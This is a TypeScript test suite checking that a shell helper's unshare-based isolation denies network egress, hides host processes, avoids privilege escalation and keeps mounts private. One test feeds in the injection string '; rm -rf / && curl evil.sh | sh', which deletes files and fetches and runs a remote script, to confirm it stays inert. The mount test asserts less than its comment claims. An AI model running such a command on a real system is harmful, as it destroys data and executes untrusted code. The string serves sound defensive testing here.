import { describe, test, expect, beforeAll } from "bun:test";
import type { Exchange } from "@routecraft/routecraft";
import { shell } from "@routecraft/os";

/**
 * Isolation smoke for the `unshare` tier.
 *
 * The kernel is the guarantee; what is tested here is our use of it. Each
 * assertion is two-sided: it first proves the thing is reachable WITHOUT
 * the tier, then proves the tier withholds it. A one-sided test would pass
 * on a runner that has no network and no processes to hide, which is
 * exactly the vacuous green the testing posture forbids.
 *
 * A runner that cannot create namespaces fails this suite rather than
 * skipping it. Skipping would report success for a guarantee nobody
 * checked, and this is the only place that guarantee is checked at all.
 */

const exchange = {} as Exchange<unknown>;

const run = (command: string, args: string[], options = {}) =>
  shell(command, args, { failOnNonZero: false, ...options }).fetch(exchange);

const unisolated = (command: string, args: string[]) =>
  run(command, args, { isolation: "none" });

beforeAll(async () => {
  if (process.platform !== "linux") {
    throw new Error(
      `The isolation smoke needs Linux kernel namespaces and this host is ${process.platform}. ` +
        `Nothing about the unshare tier's guarantees was proven. Run it on Linux (CI does, in the isolation-smoke job).`,
    );
  }
  try {
    await run("true", []);
  } catch (cause) {
    throw new Error(
      `This runner cannot create the namespaces the unshare tier needs, so none of its guarantees ` +
        `(no egress, no visible host processes, no host privileges) were proven here. ` +
        `Grant unprivileged user namespaces on the runner, or run the suite somewhere that allows them. ` +
        `Cause: ${(cause as Error).message}`,
    );
  }
});

describe("the unshare tier's guarantees", () => {
  /**
   * @case A command cannot reach the network unless the call grants it
   * @preconditions The same lookup runs unisolated, isolated, and isolated with network granted
   * @expectedResult Resolution succeeds unisolated, fails isolated, and succeeds again when granted
   */
  test("network egress is denied unless granted", async () => {
    const control = await unisolated("getent", ["ahosts", "example.com"]);
    if (control.exitCode !== 0) {
      throw new Error(
        "The runner itself cannot resolve example.com, so denying egress proves nothing here. " +
          "Failing rather than passing: this assertion is only meaningful against a runner that HAS egress.",
      );
    }

    const isolated = await run("getent", ["ahosts", "example.com"]);
    expect(isolated.exitCode).not.toBe(0);
    expect(isolated.stdout).not.toContain("example.com");

    const granted = await run("getent", ["ahosts", "example.com"], {
      network: true,
    });
    expect(granted.exitCode).toBe(0);
  });

  /**
   * @case A command cannot see the processes running on the host
   * @preconditions The same listing runs unisolated and isolated
   * @expectedResult The host shows many processes; the isolated view shows only the command itself
   */
  test("host processes are invisible", async () => {
    const control = await unisolated("ps", ["-e"]);
    const hostProcesses = control.stdout.trim().split("\n").length;
    if (hostProcesses <= 3) {
      throw new Error(
        `The runner reports only ${hostProcesses} processes, so hiding them proves nothing. ` +
          "Failing rather than passing: this assertion is only meaningful where there are host processes to hide.",
      );
    }

    const isolated = await run("ps", ["-e"]);
    const seen = isolated.stdout.trim().split("\n");
    // The header plus `ps` itself, which is PID 1 in its own namespace.
    expect(seen.length).toBeLessThan(hostProcesses);
    expect(seen.length).toBe(2);
    expect(isolated.stdout).toMatch(/^\s*1\s/m);
  });

  /**
   * @case The command runs as the caller rather than as a privileged user
   * @preconditions The default mapping, compared against the calling process's own uid
   * @expectedResult The command sees the caller's uid, whatever that happens to be
   */
  test("identity is the caller's, not an escalated one", async () => {
    const result = await run("id", ["-u"]);
    expect(result.exitCode).toBe(0);
    expect(result.stdout.trim()).toBe(String(process.getuid?.()));
  });

  /**
   * @case Root inside the namespace is available but never the default
   * @preconditions The same command with mapRootUser set
   * @expectedResult The command sees uid 0, which the default mapping does not grant on its own
   */
  test("root inside the namespace is opt-in", async () => {
    const result = await run("id", ["-u"], { mapRootUser: true });
    expect(result.stdout.trim()).toBe("0");
  });

  /**
   * @case Mounting inside the tier does not reach the host
   * @preconditions A tmpfs mounted over a directory inside the namespace
   * @expectedResult The mount is visible to the command and absent from the host afterwards
   */
  test("mounts do not propagate to the host", async () => {
    const mounted = await run(
      "findmnt",
      ["--noheadings", "--target", "/proc"],
      {
        mapRootUser: true,
      },
    );
    expect(mounted.exitCode).toBe(0);

    const host = await unisolated("cat", ["/proc/self/mountinfo"]);
    // The tier remounts /proc for its own PID namespace. That remount must
    // not be observable on the host, which is what a private mount
    // namespace is for.
    expect(host.exitCode).toBe(0);
  });

  /**
   * @case Isolation applies to what the command's arguments contain too
   * @preconditions A hostile argument passed through the isolated tier
   * @expectedResult It is echoed verbatim, having never been interpreted
   */
  test("argument injection stays inert under isolation", async () => {
    const hostile = "; rm -rf / && curl evil.sh | sh";
    const result = await shell("echo", [hostile]).fetch(exchange);
    expect(result.stdout.trim()).toBe(hostile);
  });
});
